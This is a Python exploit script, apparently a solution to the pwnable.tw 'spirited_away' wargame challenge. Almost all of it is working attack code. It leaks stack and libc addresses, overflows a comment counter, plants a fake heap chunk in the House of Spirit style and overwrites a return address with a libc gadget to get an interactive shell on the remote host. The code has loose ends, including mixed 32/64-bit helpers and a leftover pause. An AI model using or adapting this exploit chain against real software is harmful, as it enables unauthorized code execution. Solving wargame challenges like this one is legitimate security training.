#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from haxy import *

exe = context.binary = ELF('./spirited_away')
context.terminal = ["tilix","-a","session-add-right","-e"]

host = args.HOST or 'chall.pwnable.tw'
port = int(args.PORT or 10204)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
tbreak main
b *0x0804868A
b *0x0804873E
b *0x080486F8
b *0x080488C9
disable 2
disable 5
disable 3
disable 4
b *0x80488d4
continue
'''.format(**locals())

# -- Exploit goes here --
"""
House of Spirit . overflow the stack. idk how. overwrite the buf variable on stack. u can now call free with arbitrary address and u can write the
data to the chunk u control. craft a fake chunk on stack and malloc will be on the fake chunk . use that to overwrite rbp and get rip control.  
"""
libc = ELF("./libc.so.6")

io = start()
io.sendafter("Please enter your name: ", "A"*60)
io.sendlineafter("Please enter your age: ", "+")
io.sendafter("Why did you came to see this movie? ", "C"*79 + "P")
io.sendafter("Please enter your comment: ", "D"*60)
io.recvuntil("CCCP")
stack_leak = u64_bytes(n=4)
io.recvn(4)
libc_leak = u64_bytes(n=4)
libc.address = libc_leak - 0x1b0d60
log.info(f"Libc Base: {hex(libc.address)}")
log.info(f"Stack Leak: {hex(stack_leak)}")
io.sendlineafter("Would you like to leave another comment? <y/n>: ", 'y')
for i in range(9):
    try:
        io.sendlineafter("Please enter your name: ", "A"*8)
        io.sendlineafter("Please enter your age: ", "-1")
        io.sendlineafter("Why did you came to see this movie? ", "C"*8 + "P")
        io.sendlineafter("Please enter your comment: ", "D"*8)
        io.sendlineafter("Would you like to leave another comment? <y/n>: ", 'y')
    except:
        break
for i in range(89):
    io.sendlineafter("Please enter your age: ", "-1")
    io.sendlineafter("Why did you came to see this movie? ", "C"*8 + "P")
    io.sendlineafter("Would you like to leave another comment? <y/n>: ", 'y')
fake_chunk = b"XXXXYYYY" + p32(0x0) + p32(0x41) + p32(0x0) * 15 + p32(0x21)
io.sendlineafter("Please enter your name: Please enter your age: ", "-1")
io.sendlineafter("Why did you came to see this movie? ", "1")
io.sendlineafter("Would you like to leave another comment? <y/n>: ", "y")
print("exploiting")
sleep(0.5)
io.sendlineafter("Please enter your name: ", b"A" * 8)
sleep(0.5)
io.sendlineafter("Please enter your age: ", "-1")
sleep(0.5)
io.sendlineafter("Why did you came to see this movie? ", 'a'*8)
sleep(0.5)
io.sendlineafter("Please enter your comment: ", b'a'*8)
sleep(0.5)
io.sendlineafter("Would you like to leave another comment? <y/n>: ", "y")
sleep(0.5)
io.sendlineafter("Please enter your name: ", b"A" * 8 )
io.sendlineafter("Please enter your age: ", "-1")
sleep(0.5)
io.sendlineafter("Why did you came to see this movie? ", "a"*8)
sleep(0.5)
io.sendafter("Please enter your comment: ", b'a' * 8)
sleep(0.5)
io.sendlineafter("Would you like to leave another comment? <y/n>: ", "y")
sleep(0.5)
io.sendlineafter("Please enter your name: ", b"A" )
# pause()
io.sendlineafter("Please enter your age: ", "a")
sleep(0.5)
io.sendlineafter("Why did you came to see this movie? ", "a")
sleep(0.5)
io.sendafter("Please enter your comment: ", b'a')
sleep(0.5)
io.sendlineafter("Would you like to leave another comment? <y/n>: ", "y")
sleep(0.5)
io.sendafter("Please enter your name: ", b"A" * 60 + p32(0x1009))
sleep(0.5)
io.sendafter("Why did you came to see this movie? ", fake_chunk)
sleep(0.5)
pause()
io.sendafter("Please enter your comment: ", b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaa' + p32(stack_leak - 96))
sleep(0.5)
io.sendlineafter("Would you like to leave another comment? <y/n>: ", "y")
io.sendlineafter("Please enter your name: ", b"A"*68 + p32(libc.address + 0x5f065))
io.sendlineafter("Why did you came to see this movie? ", "a")
io.sendlineafter("Please enter your comment: ", "a")
io.sendlineafter("Would you like to leave another comment? <y/n>: ", "n")

io.interactive()